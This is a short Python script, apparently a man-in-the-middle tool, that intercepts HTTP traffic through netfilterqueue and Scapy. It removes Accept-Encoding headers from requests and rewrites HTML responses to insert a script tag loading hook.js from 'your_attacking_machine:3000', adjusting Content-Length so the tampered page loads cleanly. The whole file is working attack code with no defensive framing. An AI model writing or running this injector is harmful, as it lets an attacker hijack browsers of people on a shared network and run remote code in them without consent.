#!/usr/bin/env python
import netfilterqueue  # Import the netfilterqueue library for packet interception
import scapy.all as scapy  # Import Scapy for packet manipulation
import re  # Import the re module for regular expressions

# Function to set the payload of a packet to a specified load
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# Function to process intercepted packets
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Convert the packet payload to a Scapy packet

    if scapy_packet.haslayer(scapy.Raw):  # Check if the packet contains raw data
        load = scapy_packet[scapy.Raw].load  # Get the raw payload of the packet

        if scapy_packet[scapy.TCP].dport == 80:  # Check if it's an HTTP request (port 80)
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # Remove Accept-Encoding header

        elif scapy_packet[scapy.TCP].sport == 80:  # Check if it's an HTTP response (port 80)
            print("[+] Response")
            injection_code = '<script src="http://your_attacking_machine:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code + "</body>")  # Inject JavaScript code

            # Modify Content-Length header if present
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:  # Check if the payload was modified
            new_packet = set_load(scapy_packet, load)  # Create a new packet with the modified payload
            packet.set_payload(str(new_packet))  # Set the payload of the intercepted packet to the new packet

    packet.accept()  # Accept the modified packet to allow it to continue its journey

# Create a NetfilterQueue object and bind it to queue 0, then run the queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
